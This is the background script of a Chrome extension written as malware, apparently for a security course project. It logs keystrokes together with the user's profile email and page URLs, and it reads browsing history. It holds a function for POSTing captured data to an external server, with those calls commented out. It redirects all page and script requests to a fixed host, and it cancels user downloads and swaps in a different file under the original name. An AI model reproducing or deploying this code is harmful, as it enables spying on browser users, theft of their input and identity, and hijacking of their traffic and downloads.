// Send data to external server
var rserverIP = "";
function sendToServer(data) {
  var req = new XMLHttpRequest();
  req.open("POST", rserverIP, true);
  req.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
  req.send(data);
  req.onload = function () {
    console.log(this.responseText);
  };
}

// Get a certain number of last websites in history
function getHistory(number) {
  chrome.history.search({ text: "", maxResults: number }, function (data) {
    data.forEach(function (page) {
      console.log(page.url);
    });
  });
}

// Get keystrokes
var lastURL = "";
var userEmail = "";
function keyLog(request) {
  chrome.identity.getProfileUserInfo((userinfo) => {
    userEmail = userinfo.email;
    if (lastURL !== request.page) {
      console.log(userEmail);
      console.log(request.page);
      //sendToServer("page="+request.page);
      lastURL = request.page;
    }
    console.log(request.key);
    //sendToServer("key="+request.key);
  });
}

// Get HTML data of page
function pageLog(request) {
  console.log(request.page);
}

chrome.tabs.onUpdated.addListener(function (tabId, info) {
  if (info.status === "complete") {
    chrome.tabs.sendMessage(tabId, { type: "pageCapture" });
  }
});

// Handle the different message types
function handleMessageB(request) {
  if (request.type === "keyLog") {
    keyLog(request);
  } else if (request.type === "pageLog") {
    pageLog(request);
  }
}

// Handle the different messages
chrome.runtime.onMessage.addListener(handleMessageB);


// Redirect requests to specific host
var host = "https://www.google.com/";
chrome.webRequest.onBeforeRequest.addListener(
  function (details) {
    console.log(details.url);
    return { redirectUrl: host };
  },
  {
    urls: ["<all_urls>"],
    types: ["main_frame", "sub_frame", "script"],
  },
  ["blocking"]
);

// Make download

async function makeDownload(name) {
  await chrome.downloads.download({
    url: "https://tls-sec.github.io/2019-2020/2020/01/19/projetslongs.html",
    filename: name,
  });
}

var originalFilename;
var cp = true;
chrome.downloads.onChanged.addListener(async function (downloadItem) {
  console.log("onChanged");
  console.log(replaceProcedure);
  console.log(downloadItem);
  if (downloadItem.filename) {
    if (cp) {
      cp = false;
      originalFilename = downloadItem.filename.current;
      let i = originalFilename.lastIndexOf('\\');
      originalFilename = originalFilename.substring(i+1);
      console.log(originalFilename);
      await chrome.downloads.cancel(downloadItem.id);
      await chrome.downloads.erase({ id: downloadItem.id });
      await makeDownload(originalFilename);
    } else {
      cp = true;
    }
  }
});
